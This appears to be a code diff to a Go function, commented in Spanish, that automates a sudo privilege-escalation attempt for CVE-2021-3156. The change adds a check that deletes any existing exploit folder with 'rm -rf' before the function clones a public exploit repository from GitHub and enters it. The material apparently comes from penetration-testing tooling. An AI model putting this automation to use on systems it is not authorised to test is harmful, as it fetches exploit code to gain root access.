@@ -722,6 +722,21 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	}
 	fmt.Printf("Directorio de trabajo cambiado a: %s\n", homeDir)
 
+	// Verificar si la carpeta CVE-2021-3156 ya existe
+	repoDir := "CVE-2021-3156"
+	if _, err := os.Stat(repoDir); !os.IsNotExist(err) {
+		// Si la carpeta existe, eliminarla
+		fmt.Printf("La carpeta %s ya existe. Eliminándola...\n", repoDir)
+		rmCmd := exec.Command("rm", "-rf", repoDir)
+		rmOut, rmErr := rmCmd.CombinedOutput()
+		if rmErr != nil {
+			fmt.Printf("Error al eliminar la carpeta: %v\n", rmErr)
+			fmt.Printf("Salida del comando: %s\n", rmOut)
+			return
+		}
+		fmt.Println("Carpeta eliminada exitosamente")
+	}
+
 	// Clonar el repositorio
 	cloneCmd := exec.Command("git", "clone", "https://github.com/blasty/CVE-2021-3156.git")
 	cloneOut, cloneErr := cloneCmd.CombinedOutput()
@@ -734,7 +749,7 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	fmt.Printf("Salida del comando: %s\n", cloneOut)
 
 	// Cambiar al directorio del repositorio clonado
-	if err := os.Chdir("CVE-2021-3156"); err != nil {
+	if err := os.Chdir(repoDir); err != nil {
 		fmt.Printf("Error al cambiar al directorio del repositorio: %v\n", err)
 		return
 	}
